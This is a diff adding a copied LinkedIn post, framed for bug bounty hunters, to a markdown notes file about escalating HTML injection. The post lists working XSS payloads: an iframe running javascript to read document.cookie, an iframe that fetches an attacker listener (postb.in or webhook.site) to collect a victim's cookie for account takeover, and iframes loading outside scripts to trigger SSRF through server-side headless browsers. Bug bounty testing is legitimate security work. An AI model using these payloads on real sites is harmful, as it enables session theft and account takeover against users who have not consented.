@@ -57,7 +57,31 @@ Always check email confirmations
 
 
 
+---
 
+[linked_in_post](https://www.linkedin.com/posts/hossam-shady-123330193_hello-bug-bounty-hunters-dont-just-report-activity-7359203481318055936-lGGz/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)
+
+<details>
+
+Hello, Bug Bounty Hunters: Don't Just Report HTML Injection - Weaponize It
+⚠️ Turn low-severity issues into high-impact findings.
+⚠️ HTML Injection → Stored XSS → SSRF → Account Takeover 🔥
+ * HTML Injection → Stored / Blind XSS:
+✅ Test basic reflection:
+<h1>Hello</h1>
+✅ If reflected → Try injecting an Iframe:
+<IFRAME SRC="javascript​:alert(document.cookie);"></IFRAME>
+ * Stored / Blind XSS → ATO (Account Takeover):
+• Attacker server: Create a listener at https://postb.in or https://webhook.site
+• Inject:
+<IFRAME src="javascript​:fetch('https://lnkd.in/d9FNKzjx')"></IFRAME>
+• Result: You receive the user's cookie on postb.in
+ * HTML Injection → SSRF via Headless Browsers:
+• If payload is rendered server-side (feedback bots, ticket systems), try:
+<IFRAME src="https://lnkd.in/dte5BfwK"></IFRAME>
+<IFRAME srcdoc​="<​script src='https://lnkd.in/dcGV_TU2'><​/script>"></IFRAME>
+ 
+</details>
 
 
 
